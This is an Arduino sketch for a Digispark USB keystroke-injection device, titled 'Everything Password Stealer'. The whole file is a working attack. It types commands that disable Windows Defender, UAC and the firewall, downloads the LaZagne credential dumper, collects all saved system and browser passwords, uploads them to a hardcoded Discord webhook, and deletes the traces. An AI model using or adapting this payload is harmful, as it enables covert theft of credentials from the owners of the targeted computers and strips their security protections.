#include "DigiKeyboard.h"

void setup() {}

void loop() {
	DigiKeyboard.sendKeyStroke(0);
	// Title: Everything Password Stealer
	// Description: Steals every password in every windows 10 or 11 passwords with LaZagne
	// Bypasses UAC, Firewall, and Defender with persistence whatsoever
	// Exfil your data to your not-so private discord server with computer name as a filename (to avoid confusions as usual)
	// Author: sativa/einxrw
	
	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_M);
	DigiKeyboard.delay(2000);
	
	// Open Windows Defender Settings
	DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,41);
	DigiKeyboard.delay(750);
	DigiKeyboard.print("windows security");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1500);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	
	// Navigate to Manage Settings
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);
	
	// Open and turn off Realtime Protection
	DigiKeyboard.sendKeyStroke(44);
	DigiKeyboard.delay(1000);
	DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_Y);
	DigiKeyboard.delay(1000);
	
	// Exit security settings
	DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_F4);
	DigiKeyboard.delay(3000);
	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
	DigiKeyboard.delay(1000);
	
	// Open the Powershell as Administrator
	DigiKeyboard.print("powershell");
	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY,KEY_ENTER);
	DigiKeyboard.delay(2000);
	DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_Y);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1000);
	
	// Disabling the UAC
	DigiKeyboard.print("Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1000);
	
	// Disabling the Firewall Part 1
	DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1000);
	
	// Disabling the Firewall Part 2
	DigiKeyboard.print("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1000);
	
	// Disabling the Virus and Threat Protection
	DigiKeyboard.print("New-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1000);
	DigiKeyboard.print("Add-MpPreference -ExclusionPath \"C:\"");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(3000);
	DigiKeyboard.print("$Test = [System.Environment]::GetEnvironmentVariable('TEMP','Machine');Start-BitsTransfer https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe -Destination \"$Test/l.exe\"; cd $Test");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(15000);
	DigiKeyboard.print(".\\l.exe all -vv > \"$env:computername.txt\"; .\\l.exe browsers -vv >> \"$env:computername.txt\"; curl.exe [https://discord.com/api/webhooks/1173011529491296286/5F-i0yxrzHsmHVtmepVJtW3HPX4aRWxKPtvxwPCDve1G34j27jL7wP4khTMZoR5Wet4G] -F \"file1=@$Test/$env:computername.txt\"; Remove-Item \"$x/$env:computername.txt\", \"$x/l.exe\" -Force -ErrorAction SilentlyContinue");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.print("exit");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
}
